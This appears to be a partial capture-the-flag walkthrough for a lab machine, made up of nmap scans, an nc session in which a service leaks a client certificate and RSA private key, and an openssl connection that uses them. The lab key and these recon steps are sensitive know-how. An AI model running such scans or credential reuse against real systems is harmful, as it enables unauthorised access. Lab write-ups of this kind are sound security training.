
***NMAP scan and find the open port***

```
nmap -T4 -p- --min-parallelism 100 --max-retries 2 10.48.129.249
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-11 07:18 -0400
Nmap scan report for 10.48.129.249
Host is up (0.060s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4040/tcp  open  yo-main
9009/tcp  open  pichat
54321/tcp open  unknown



```


```
nmap -sCV -p 22,80,4040,9009,54321 10.48.129.249    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-11 07:38 -0400
Nmap scan report for 10.48.129.249
Host is up (0.048s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:75:5a:e4:18:e0:9f:5f:75:68:b8:a6:4a:5c:60:df (RSA)
|   256 4a:fe:58:9d:4a:f2:b7:6d:cf:b7:5b:cb:ff:0b:28:e9 (ECDSA)
|_  256 7c:1e:5c:10:36:2c:da:3e:fe:70:7e:a1:02:4f:ad:ff (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.48.129.249:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2026-06-11T11:14:35
|_Not valid after:  2027-06-11T11:14:35
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Thu, 11 Jun 2026 11:39:22 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|     Need to try and secure
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Thu, 11 Jun 2026 11:39:23 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| tls-alpn: 
|_  http/1.1
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2026-06-11T11:14:35
|_Not valid after:  2027-06-11T11:14:35
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.99%T=SSL%I=7%D=6/11%Time=6A2A9E62%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Thu,\x2011\x20Jun\x202026\x2011:39:22\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Thu,\x2011\x20Jun\x202026\x2011:39:23\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.99%I=7%D=6/11%Time=6A2A9E51%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

***cert privet_key**

```
nc 10.48.129.249 9009                               


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? tls
Sorry, unrecognized request: 'tls'

You use this service to recover your client certificate and private key
What are you looking for? client certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNjA2MTExMTE0MzZaFw0yNzA2MTExMTE0MzZaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDar1O3
EcpYxJL2UZcbE7v9riegdlBfMpbyTsSKKc3ttwahlWbzNCODyUcvMLI6xAF18Tia
YPWmEOSL5pEC88H7Yc1J33E+1Wt1IKVWpA/CH7vj7iMg4z76rJLM9GQpp1Ouwyhq
lVWBd4zLOQJJpqgwftl3BvTaDVpgWnW826k/LvBOhbd/lTIw6Na4ngZyl3wlEyyH
22nB7ACUByp6nvlJlAM79/xtwWMPlt77KKsTylAbI5ufIA6wr+T7oplfhdngf8kk
kGHVm1C53CNJ52QWrZOgkHDsAGqWnPw81z6ofp0yiNRiS+tbofej6xp5/9bEuABI
0uLcWy6F8Sq7gh9zAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAGjdXM4j6NrSJ0+L
Ls+Z/YBJMdv5v0FkdROib6B5i6bZWW/K0xtuo729TjPvhTrQbuAaNgtply3dQ2UN
bg+tXQQJlQ7IEZrjezMeWSNbU6lG29BM3kd+VmffM5uPpwOWx2XS0BE6ilkx9jzE
scE0Xwy9YCXgOh/C9XHymOkTPQk1qaXv1UhTVzesgzWsGBQKSQeRaLOPjP0W+VJJ
GBD9Za1a2LlgzYthAQ+obLe/hKpZawS81zHtjZ0vjpTJnSY6tQEr1G15ZhQg4tl6
6Ewg7F35L20w6Ipu+LkYcYpIqP2h1DzLeMx5CwFQoigdjAlz+2pcdBvFdMw/ueJX
lG1N59s=
-----END CERTIFICATE-----


What are you looking for? private key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEA2q9TtxHKWMSS9lGXGxO7/a4noHZQXzKW8k7EiinN7bcGoZVm
8zQjg8lHLzCyOsQBdfE4mmD1phDki+aRAvPB+2HNSd9xPtVrdSClVqQPwh+74+4j
IOM++qySzPRkKadTrsMoapVVgXeMyzkCSaaoMH7Zdwb02g1aYFp1vNupPy7wToW3
f5UyMOjWuJ4Gcpd8JRMsh9tpwewAlAcqep75SZQDO/f8bcFjD5be+yirE8pQGyOb
nyAOsK/k+6KZX4XZ4H/JJJBh1ZtQudwjSedkFq2ToJBw7ABqlpz8PNc+qH6dMojU
YkvrW6H3o+saef/WxLgASNLi3FsuhfEqu4IfcwIDAQABAoIBAQDOCPYEu3w7mikk
bcbCOhuabOTk59PdfVp+PPwreCuO1iwnPQ3cAbmcRp0MtwKVH2qI5pZ/zO5kYfIS
ZU8myuZuo7y45w5ZNtahafqc4MIAEcoCe7EZIUGLB+DfvTpJjF7pfvGrSbtf2XUL
W1Dud1hrKHhXDnTOpFoMAe5/2y1gWmhb+chcpyZXEeqYm92xkQRxujt+VgsG2dQ7
77MSSr1ZH0dEZxnHLeMowuMpFHv0icyzQbh79ESOI/LoF4KOc7nv7yYSn+n2XsBl
KNq6sotRfiRnABthhSdOFiv4ifJmeL4c7Cg9JKtjx/ZrvUXreLIqkxWakgUuq9pK
O4g9qmeBAoGBAPuC/7ILq3RV2inUitB4uPK3y0Qi+89zDGFdKuWwx1a/X+vcRFE6
0oBwxwXYscZ5ENkd2yNBMLOviqX4xR5yAJ/3VVNulvCZFJtl1rNWdDeV8GZe6D65
+l4Pp4toS2iIOMhBRAILi8LEdBHc5fBh/LK2yoC7hxoIbOyjzuH4suHhAoGBAN6W
XNmWC4tMWa+9v1GunbnqZYe5H1il5zaDAac/g+/FvvkVmCnPEtRuFFUZxp3aPhL9
yYMMZXLTZ4++BeBUzgl2O9cCsT27wZhdT7nidmhc6UyUPDtxTEVQbrhFgCyG/4Ev
nZMjzxLfMKQya31TfyyynnMVB6h8bcjtVDNHllPTAoGBAMyoPAhVFp8DfRKssIgS
s+xNQkmfbefQZjKT7WQaBRrBfvwdsDmo88EwA8LuITqvKNaDRN3bHhYYsWl8lGnB
umBwki3hv1DoP6xzodEseEUC7Stf7vubue7wLhVyOGpG7m2FLiG7424JDam7Zh/E
nCuQMheugLDeSkQEx0N5a5YBAoGBAMts0ijNV3mUarcRjCNjmaTLEsVqq7pBzUDl
lAI9KyBcMj/Eu48iP8xDWnO4HewwA+EpbhxFnQXHLXOSMB6ogrDlDKVhQYjw6mqM
hQuWa67Pkyw4oZ+V2SXT74ybgBuxuRtg3/sUk/BkaDj4F4KvZ5/7EpKMmrYiGdez
BuvitgGfAoGBAMAqjyauQ3D+MA2RNHs+QGlDmlfFmi45lOmK1RsuemzInfY1OW5k
KH7CulV4jY3+k9yFhsgqvGGQcRm4Y1z2N7sdTVIbAojARqsS7mTVShfxRuMcRrVh
nC5XPds9yfxyvWiVmH7fsOXRk18CKgMbm1EwYNPyd3oiY61AL7BXW+kK
-----END RSA PRIVATE KEY-----


What are you looking for? 


```


```
─(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# nano cert.pem             
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# nano key.pem
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# ls
500-worst-passwords.txt          cert.pem       key.pem                                                  notice.txt             sh.php
ap-south-1-hrmunna-regular.ovpn  id_rsa         N1R0M-Jr-Pentester-AD-v01-6a1e8133d0022c23d11cd1c3.ovpn  php-reverse-shell.php  suspicious.pcapng
best1050.txt                     important.jpg  New_site.txt                                             ro.php
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# openssl s_client -connect 10.48.129.249 -cert cert.pem  -key key.pem
40372E77BC7F0000:error:8000006F:system library:BIO_connect:Connection refused:../crypto/bio/bio_sock2.c:183:calling connect()
40372E77BC7F0000:error:10000067:BIO routines:BIO_connect:connect error:../crypto/bio/bio_sock2.c:185:
connect:errno=111
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# openssl s_client -connect 10.48.129.249:54321 -cert cert.pem -key key.pem
Connecting to 10.48.129.249
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=localhost
verify return:1
---
Certificate chain
 0 s:CN=localhost
   i:CN=localhost
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Jun 11 11:14:35 2026 GMT; NotAfter: Jun 11 11:14:35 2027 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICrzCCAZcCFFP+l9CVM923U0VW5p046Vf8+7pKMA0GCSqGSIb3DQEBCwUAMBQx
EjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yNjA2MTExMTE0MzVaFw0yNzA2MTExMTE0
MzVaMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBAPi96yreZ9CEatyxMb6q3DIBSPj3BUsmyLo02UKd44lpm7Oi9e1c
RlJ40ygKB2/vVk+RjRljRVy9rHnM8bNXx4XK48pklBn4V2Zp6gMRsIo0mYZEXwwp
jO/F2N4DdAkXaCd+cdanTLGND93YuL9snKJJTMIQUZQ2Ymn1sjCT+eh1lviX4v8M
fMtg/sIKGFydNPh24qMJ6uqtfC1io/fb/4Lya9f/Xnf73EMp7P0dF9b48NKrLrBv
7Xgt50Bizj71ZvoBN8MUwRsDDUjojrF63y78/ezOkqQ/0AYOHTA4wG1tGEsVuE3o
2QDyzGOCYSFBzqiocIDXBabAwz8sYuJFD68CAwEAATANBgkqhkiG9w0BAQsFAAOC
AQEA1hLpyR2LrGkmDRF1UwHgpy/wwrpEF9rZTv3LQk4o+wBBl7n6X692bzVVGp2m
Clcyj+FUrfFJa49iLlO1pUkYP7pYz90Lhc5GLdfjfzSBeJkO0CZhsBmjZAQ9sodP
RNkz8fuBPkj4lhHw7OC7uCETzFHpaCAIKQG8YWRqDFjISN6DtXmxNIbXnCSFCZm+
xZZ3AA/LcjLBIYtg4mO5M4a34JYdFxYhYDpVjNMm/KGgK7YhUJqs+76/9wgkdA/o
KyVZ432TlCYa8QbY7WQhybzfMYeFSaWceaU50lc4a3DL29nDDatmnSNRbGAAK8cN
lKtf2061KdN+2m0JTLuzLMCrTw==
-----END CERTIFICATE-----
subject=CN=localhost
issuer=CN=localhost
---
Acceptable client certificate CA names
CN=localhost
Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:ECDSA+SHA1:RSA+SHA224:RSA+SHA1
Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 1348 bytes and written 2736 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 2048 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 2860D5C7F423578D0F66924C986F986F3B69CF96878C9250CD6165026785865E
    Session-ID-ctx: 
    Resumption PSK: 14136D900A1E0DB1281ED3A4BF4ADC72D26B1EAF95E7277500EC8EC053A3DA3F603CC89A7BD566F30E58237EC5371861
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 63 a7 f8 bc 76 05 b5 7c-bf 5a 34 e2 f9 4c b9 42   c...v..|.Z4..L.B
    0010 - 41 2c 48 f2 2c 5f 10 18-a0 a1 1c fe 57 c3 e1 99   A,H.,_......W...
    0020 - af 25 8f f9 e7 85 0a 8d-45 18 4d c0 14 6b 34 25   .%......E.M..k4%
    0030 - d2 0f 58 2e 80 5d a5 ce-89 8b 62 fa 0d 9f 94 90   ..X..]....b.....
    0040 - 1e 0a 3e 4d 34 a5 8c 75-8f 9f 24 f3 cf 88 9e e7   ..>M4..u..$.....
    0050 - bc 7c e5 02 61 e1 07 0b-85 d7 7c 2b cb 35 16 e4   .|..a.....|+.5..
    0060 - d7 d9 3a d7 3b b6 b6 90-cd b0 50 70 c8 e3 79 74   ..:.;.....Pp..yt
    0070 - 30 a6 7f dd 10 26 e6 e4-70 ce 96 9a f1 7b 1d 15   0....&..p....{..
    0080 - 57 c6 63 be 6b 8a cf 76-23 d7 18 bc 54 93 33 5f   W.c.k..v#...T.3_
    0090 - 10 2c bb a8 40 3b 73 e3-04 ad ec 4b 53 eb c0 09   .,..@;s....KS...
    00a0 - a5 be 87 dd 5a 62 3e c4-b8 41 a3 39 f2 02 c3 5e   ....Zb>..A.9...^
    00b0 - f5 b7 1a 8e 9d 03 28 e3-36 3a 5e e4 c6 a3 dc 2c   ......(.6:^....,
    00c0 - 4d e6 ce e5 88 32 77 b2-a6 b4 35 24 d9 3a ef c5   M....2w...5$.:..
    00d0 - 86 a8 f2 96 44 04 4d 5c-05 79 b1 27 80 5b 39 5b   ....D.M\.y.'.[9[
    00e0 - 91 e9 ae 6c 6b e1 74 5c-a7 0d 3f 33 cb 10 cd 13   ...lk.t\..?3....
    00f0 - 93 22 f5 d1 17 94 47 8e-0c cc 0d bd df a0 2e 94   ."....G.........
    0100 - 03 cb 1f c0 6c 8d b8 de-84 61 7a 6b a3 f5 92 f3   ....l....azk....
    0110 - 54 54 d5 1d 7b 21 d9 04-73 7c 0e 37 7e 2d fa 79   TT..{!..s|.7~-.y
    0120 - f6 84 9b 8c 5d 67 0b b5-0b c7 0f b0 98 56 bd a3   ....]g.......V..
    0130 - 61 55 8e ea 04 64 e5 40-b9 ef 80 89 c6 6a 94 72   aU...d.@.....j.r
    0140 - 06 bf 93 3c 89 d0 28 c2-20 56 ab 69 ba cf 7d 57   ...<..(. V.i..}W
    0150 - 8e 64 63 b6 77 2e 06 49-9f 7c 88 8c 59 10 97 0d   .dc.w..I.|..Y...
    0160 - 24 54 86 d5 6c f6 0f 54-12 18 8a 28 1c 3b 34 e5   $T..l..T...(.;4.
    0170 - bb 75 c3 0b 0f c3 a9 17-ad 6c ca 09 ea 12 3f 50   .u.......l....?P
    0180 - 95 dc 8e 05 8d 78 fc 18-c4 c0 51 de da 6d e2 5b   .....x....Q..m.[
    0190 - 18 ab d0 7f 75 04 45 53-9b 00 34 71 d7 e8 bb 0e   ....u.ES..4q....
    01a0 - 67 31 4f 19 e6 8b b0 f7-db f6 cc 82 f8 cc f4 d9   g1O.............
    01b0 - a9 4e cf f7 3d c0 7e af-38 48 2e 85 7d 02 08 50   .N..=.~.8H..}..P
    01c0 - ea 70 a3 77 84 6f fa 80-5d 72 7e e0 90 ba fa 52   .p.w.o..]r~....R
    01d0 - 52 9c cc 54 26 4a 7b 10-76 af 6f 9c 39 7f 27 7d   R..T&J{.v.o.9.'}
    01e0 - 41 c1 00 55 56 95 fa 16-0c e9 e8 90 af f3 3c df   A..UV.........<.
    01f0 - 31 a6 9b 25 96 e1 09 b2-75 a5 e5 02 72 03 b6 74   1..%....u...r..t
    0200 - fd 21 02 26 bd cd fc 11-f4 7f ee b6 64 97 96 9f   .!.&........d...
    0210 - b6 21 b9 5c 1e a6 f4 87-5b 77 20 66 88 e3 41 f1   .!.\....[w f..A.
    0220 - 19 49 ff b9 9e 61 d2 ed-eb b0 14 e9 a8 96 27 90   .I...a........'.
    0230 - 06 31 e1 64 3e 68 30 c4-31 82 64 72 9a 92 d2 11   .1.d>h0.1.dr....
    0240 - d6 fb 94 c1 7b 79 1e eb-5c 19 90 45 02 e6 31 60   ....{y..\..E..1`
    0250 - b2 53 1e 19 71 9e 91 49-f0 35 7d 78 09 8f e6 dd   .S..q..I.5}x....
    0260 - e7 21 a7 37 ea 70 84 d9-39 fe 21 5c d6 ab 07 0a   .!.7.p..9.!\....
    0270 - fe 8a 0e 0c c0 91 25 52-f7 fa 52 4d b8 74 28 f5   ......%R..RM.t(.
    0280 - af 70 0a 33 3e 4d 0f 71-5e 22 33 d1 23 4d 50 16   .p.3>M.q^"3.#MP.
    0290 - e9 cd 9b 33 3d 38 85 bf-6e dd 80 7f 53 62 90 19   ...3=8..n...Sb..
    02a0 - 5b e3 01 b4 3b ed 56 f8-f0 1a 19 d4 3c c8 52 8c   [...;.V.....<.R.
    02b0 - 27 32 0c 02 af da 5f 7f-e0 d6 88 b4 28 d0 c7 f5   '2...._.....(...
    02c0 - 1e c0 84 c0 9f e4 e8 97-15 ad 2f f6 05 68 f2 d1   ........../..h..
    02d0 - 66 5f dd a4 dd 1d 67 cc-9e 93 34 66 c6 c2 76 3c   f_....g...4f..v<
    02e0 - fb 29 40 8b bc 75 4a 6d-82 66 6c 8f 20 c3 ec 0c   .)@..uJm.fl. ...
    02f0 - 39 38 62 29 83 74 7d b8-ba a2 61 fb 92 71 26 60   98b).t}...a..q&`
    0300 - 15 09 0b 7a 4a 8a 7c 90-6d 58 b7 4a c9 32 d3 a8   ...zJ.|.mX.J.2..
    0310 - 10 3f 15 de 26 9b 40 7c-e8 66 59 14 25 0d 65 db   .?..&.@|.fY.%.e.
    0320 - ac b2 e8 cd ca 51 41 15-d7 c5 5d 70 ab 27 01 6c   .....QA...]p.'.l
    0330 - 2f 35 2c 22 bc 6e 72 01-d4 af 3d 4b d8 7c 34 61   /5,".nr...=K.|4a
